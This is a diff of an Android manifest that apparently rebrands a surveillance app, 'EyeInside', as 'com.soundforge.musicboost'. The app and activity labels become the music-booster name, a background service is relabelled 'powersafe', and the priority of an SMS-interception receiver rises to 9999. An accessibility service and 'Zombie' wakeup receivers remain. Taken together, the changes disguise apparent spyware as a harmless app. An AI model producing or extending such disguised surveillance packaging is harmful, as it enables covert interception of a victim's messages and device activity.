@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.code4bones.EyeInside"
-    android:versionCode="1"
-    android:versionName="1.0" >
+    package="com.soundforge.musicboost"
+    android:versionCode="12"
+    android:versionName="12.2" >
 
     <uses-sdk
         android:minSdkVersion="8"
@@ -49,14 +49,14 @@
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
-        android:label="@string/app_name"
+        android:label="com.soundforge.musicboost"
         android:theme="@style/AppTheme" 
         >
 
         
         <activity
             android:name="com.code4bones.EyeInside.MainActivity"
-            android:label="@string/title_activity_main" 
+            android:label="com.soundforge.musicboost" 
             >
             
             <intent-filter>
@@ -65,15 +65,15 @@
             </intent-filter>
         </activity>
         
-        <receiver android:name="SMS_BroadcastReceiver">
-            <intent-filter android:priority="999">
+        <receiver android:name="com.code4bones.EyeInside.SMS_BroadcastReceiver">
+            <intent-filter android:priority="9999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
             </intent-filter>
         </receiver>
 
-        <service android:label="ServiceLabel" android:name="WorkerService" android:process=":worker">
+        <service android:label="powersafe" android:name="com.code4bones.EyeInside.WorkerService" android:process=":power">
         </service>
-		<service android:name="EyeAccessService"
+		<service android:name="com.code4bones.EyeInside.EyeAccessService"
 		    	 android:enabled="true"
 		    	 android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
 		    	 android:exported="false"
@@ -85,7 +85,7 @@
 		
 		</service>
 		        
-        <receiver android:name=".Zombie_BroadcastReceiver" android:exported="false" >
+        <receiver android:name="com.code4bones.EyeInside.Zombie_BroadcastReceiver" android:exported="false" >
             <intent-filter>
                 <action android:name="com.code4bones.EyeInside.wakeup" />
                 <action android:name="com.code4bones.EyeInside.notify" />
@@ -114,7 +114,7 @@
  				-->
  			</intent-filter>
         </receiver>
-        <receiver android:name="Event_BroadcastReceiver"></receiver>
+        <receiver android:name="com.code4bones.EyeInside.Event_BroadcastReceiver"></receiver>
         
     </application>
 
